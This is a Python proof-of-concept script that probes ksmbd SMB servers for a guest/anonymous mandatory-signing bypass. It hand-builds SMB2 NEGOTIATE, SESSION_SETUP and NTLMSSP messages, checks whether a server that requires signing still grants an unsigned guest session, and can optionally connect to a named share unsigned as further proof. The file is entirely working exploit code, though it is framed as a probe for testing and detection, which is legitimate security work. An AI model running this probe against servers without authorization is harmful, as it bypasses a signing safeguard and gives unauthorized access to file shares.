#!/usr/bin/env python3
#
# Minimal SMB2 probe for the ksmbd guest/anonymous signing bypass.
#
# It intentionally sends a client that supports signing but does not require it.
# A vulnerable ksmbd server configured with mandatory signing can still accept a
# guest-mapped NTLMSSP_AUTH message and return an unsigned successful response.

import argparse
import os
import socket
import struct
import sys


SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001
SMB2_TREE_CONNECT = 0x0003

SMB2_FLAGS_SIGNED = 0x00000008
SMB2_NEGOTIATE_SIGNING_ENABLED = 0x0001
SMB2_NEGOTIATE_SIGNING_REQUIRED = 0x0002
SMB2_SESSION_FLAG_IS_GUEST = 0x0001

STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
STATUS_LOGON_FAILURE = 0xC000006D

NTLMSSP_NEGOTIATE_UNICODE = 0x00000001
NTLMSSP_REQUEST_TARGET = 0x00000004
NTLMSSP_NEGOTIATE_SIGN = 0x00000010
NTLMSSP_NEGOTIATE_NTLM = 0x00000200
NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
NTLMSSP_NEGOTIATE_EXTENDED_SEC = 0x00080000
NTLMSSP_NEGOTIATE_TARGET_INFO = 0x00800000
NTLMSSP_NEGOTIATE_128 = 0x20000000
NTLMSSP_NEGOTIATE_56 = 0x80000000

NTLM_FLAGS = (
    NTLMSSP_NEGOTIATE_UNICODE
    | NTLMSSP_REQUEST_TARGET
    | NTLMSSP_NEGOTIATE_SIGN
    | NTLMSSP_NEGOTIATE_NTLM
    | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    | NTLMSSP_NEGOTIATE_EXTENDED_SEC
    | NTLMSSP_NEGOTIATE_TARGET_INFO
    | NTLMSSP_NEGOTIATE_128
    | NTLMSSP_NEGOTIATE_56
)


def status_name(status):
    names = {
        STATUS_SUCCESS: "STATUS_SUCCESS",
        STATUS_MORE_PROCESSING_REQUIRED: "STATUS_MORE_PROCESSING_REQUIRED",
        STATUS_LOGON_FAILURE: "STATUS_LOGON_FAILURE",
    }
    return names.get(status, f"0x{status:08x}")


def recv_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("connection closed")
        data.extend(chunk)
    return bytes(data)


def recv_smb(sock):
    nb = recv_exact(sock, 4)
    size = int.from_bytes(nb, "big") & 0x00FFFFFF
    if size < 64:
        raise ValueError(f"short SMB response: {size} bytes")
    return recv_exact(sock, size)


def send_smb(sock, packet):
    sock.sendall(len(packet).to_bytes(4, "big") + packet)


def smb2_header(command, message_id, session_id=0, tree_id=0, flags=0):
    return struct.pack(
        "<4sHHIHHIIQIIQ16s",
        b"\xfeSMB",
        64,
        0,
        0,
        command,
        1,
        flags,
        0,
        message_id,
        os.getpid() & 0xFFFFFFFF,
        tree_id,
        session_id,
        b"\x00" * 16,
    )


def parse_header(packet):
    if len(packet) < 64 or packet[:4] != b"\xfeSMB":
        raise ValueError("not an SMB2 packet")
    (
        _proto,
        _structure_size,
        _credit_charge,
        status,
        command,
        _credits,
        flags,
        _next_command,
        message_id,
        _pid,
        tree_id,
        session_id,
        _signature,
    ) = struct.unpack("<4sHHIHHIIQIIQ16s", packet[:64])
    return {
        "status": status,
        "command": command,
        "flags": flags,
        "message_id": message_id,
        "tree_id": tree_id,
        "session_id": session_id,
        "signed": bool(flags & SMB2_FLAGS_SIGNED),
    }


def security_buffer(length, offset):
    return struct.pack("<HHI", length, length, offset)


def ntlm_negotiate_blob():
    return struct.pack(
        "<8sIIHHIHHI",
        b"NTLMSSP\x00",
        1,
        NTLM_FLAGS,
        0,
        0,
        32,
        0,
        0,
        32,
    )


def ntlm_auth_blob(username, domain="", workstation="POC"):
    domain_b = domain.encode("utf-16le")
    user_b = username.encode("utf-16le")
    workstation_b = workstation.encode("utf-16le")

    fixed_len = 64
    domain_off = fixed_len
    user_off = domain_off + len(domain_b)
    workstation_off = user_off + len(user_b)
    session_key_off = workstation_off + len(workstation_b)

    header = b"".join(
        [
            b"NTLMSSP\x00",
            struct.pack("<I", 3),
            security_buffer(0, fixed_len),
            security_buffer(0, fixed_len),
            security_buffer(len(domain_b), domain_off),
            security_buffer(len(user_b), user_off),
            security_buffer(len(workstation_b), workstation_off),
            security_buffer(0, session_key_off),
            struct.pack("<I", NTLM_FLAGS),
        ]
    )
    if len(header) != fixed_len:
        raise AssertionError(f"unexpected NTLMSSP_AUTH fixed length: {len(header)}")
    return header + domain_b + user_b + workstation_b


def smb2_negotiate_packet(message_id):
    dialects = struct.pack("<HHH", 0x0202, 0x0210, 0x0300)
    body = struct.pack(
        "<HHHHI16sIHH",
        36,
        3,
        SMB2_NEGOTIATE_SIGNING_ENABLED,
        0,
        0,
        os.urandom(16),
        0,
        0,
        0,
    ) + dialects
    return smb2_header(SMB2_NEGOTIATE, message_id) + body


def smb2_session_setup_packet(message_id, blob, session_id=0, security_mode=SMB2_NEGOTIATE_SIGNING_ENABLED):
    security_buffer_offset = 64 + 24
    body = struct.pack(
        "<HBBIIHHQ",
        25,
        0,
        security_mode,
        0,
        0,
        security_buffer_offset,
        len(blob),
        0,
    )
    return smb2_header(SMB2_SESSION_SETUP, message_id, session_id=session_id) + body + blob


def smb2_tree_connect_packet(message_id, session_id, server, share):
    path = f"\\\\{server}\\{share}".encode("utf-16le")
    path_offset = 64 + 8
    body = struct.pack("<HHHH", 9, 0, path_offset, len(path))
    return smb2_header(SMB2_TREE_CONNECT, message_id, session_id=session_id) + body + path


def parse_negotiate_response(packet):
    header = parse_header(packet)
    if len(packet) < 70:
        raise ValueError("short NEGOTIATE response")
    security_mode = struct.unpack_from("<H", packet, 64 + 2)[0]
    dialect = struct.unpack_from("<H", packet, 64 + 4)[0]
    return header, security_mode, dialect


def parse_session_setup_response(packet):
    header = parse_header(packet)
    session_flags = None
    if len(packet) >= 68:
        session_flags = struct.unpack_from("<H", packet, 64 + 2)[0]
    return header, session_flags


def run_probe(args):
    message_id = 0
    with socket.create_connection((args.target, args.port), timeout=args.timeout) as sock:
        sock.settimeout(args.timeout)

        send_smb(sock, smb2_negotiate_packet(message_id))
        neg = recv_smb(sock)
        neg_header, security_mode, dialect = parse_negotiate_response(neg)
        if neg_header["status"] != STATUS_SUCCESS:
            raise RuntimeError(f"NEGOTIATE failed: {status_name(neg_header['status'])}")
        server_requires_signing = bool(security_mode & SMB2_NEGOTIATE_SIGNING_REQUIRED)
        print(f"[+] NEGOTIATE dialect=0x{dialect:04x} security_mode=0x{security_mode:04x}")
        print(f"[+] server_requires_signing={server_requires_signing}")

        message_id += 1
        send_smb(sock, smb2_session_setup_packet(message_id, ntlm_negotiate_blob()))
        sess1 = recv_smb(sock)
        sess1_header, _session_flags = parse_session_setup_response(sess1)
        print(f"[+] NTLMSSP_NEGOTIATE status={status_name(sess1_header['status'])} session_id=0x{sess1_header['session_id']:x}")
        if sess1_header["status"] != STATUS_MORE_PROCESSING_REQUIRED:
            raise RuntimeError("server did not continue NTLMSSP exchange")

        message_id += 1
        auth = ntlm_auth_blob(args.user, args.domain, args.workstation)
        send_smb(sock, smb2_session_setup_packet(message_id, auth, session_id=sess1_header["session_id"]))
        sess2 = recv_smb(sock)
        sess2_header, session_flags = parse_session_setup_response(sess2)
        guest = bool((session_flags or 0) & SMB2_SESSION_FLAG_IS_GUEST)
        print(
            "[+] NTLMSSP_AUTH "
            f"status={status_name(sess2_header['status'])} "
            f"session_id=0x{sess2_header['session_id']:x} "
            f"session_flags=0x{(session_flags or 0):04x} "
            f"signed={sess2_header['signed']}"
        )

        tree_header = None
        if args.share and sess2_header["status"] == STATUS_SUCCESS:
            message_id += 1
            send_smb(
                sock,
                smb2_tree_connect_packet(
                    message_id,
                    sess2_header["session_id"],
                    args.tree_server or args.target,
                    args.share,
                ),
            )
            tree = recv_smb(sock)
            tree_header = parse_header(tree)
            print(
                "[+] TREE_CONNECT "
                f"status={status_name(tree_header['status'])} "
                f"tree_id=0x{tree_header['tree_id']:x} "
                f"signed={tree_header['signed']}"
            )

    vulnerable = (
        server_requires_signing
        and sess2_header["status"] == STATUS_SUCCESS
        and guest
        and not sess2_header["signed"]
    )
    if vulnerable:
        print("[!] VULNERABLE: mandatory signing was advertised, but guest session setup succeeded unsigned.")
        if tree_header and tree_header["status"] == STATUS_SUCCESS and not tree_header["signed"]:
            print("[!] VULNERABLE: unsigned TREE_CONNECT also succeeded on the guest session.")
        return 0

    if server_requires_signing and sess2_header["status"] == STATUS_LOGON_FAILURE:
        print("[+] NOT VULNERABLE: server rejected guest/null authentication while signing is required.")
    elif not server_requires_signing:
        print("[?] INCONCLUSIVE: server did not advertise mandatory signing.")
    elif sess2_header["status"] != STATUS_SUCCESS:
        print("[+] NOT VULNERABLE/NOT TRIGGERED: authentication did not establish a session.")
    elif not guest:
        print("[?] INCONCLUSIVE: session did not map to guest; adjust --user or server guest mapping.")
    elif sess2_header["signed"]:
        print("[+] NOT VULNERABLE: successful guest session setup response was signed.")
    else:
        print("[?] INCONCLUSIVE: trigger conditions were not all met.")
    return 1


def main():
    parser = argparse.ArgumentParser(
        description="Probe ksmbd guest/anonymous mandatory-signing bypass."
    )
    parser.add_argument("target", help="ksmbd server address")
    parser.add_argument("-p", "--port", type=int, default=445, help="SMB TCP port")
    parser.add_argument("-u", "--user", default="guest", help="username expected to map to guest")
    parser.add_argument("-d", "--domain", default="", help="NTLM domain string")
    parser.add_argument("-w", "--workstation", default="POC", help="NTLM workstation string")
    parser.add_argument("--share", help="optional share name for unsigned TREE_CONNECT proof")
    parser.add_argument("--tree-server", help="server name/IP to place in \\\\server\\share path")
    parser.add_argument("--timeout", type=float, default=5.0, help="socket timeout in seconds")
    args = parser.parse_args()

    try:
        return run_probe(args)
    except Exception as exc:
        print(f"[-] probe failed: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
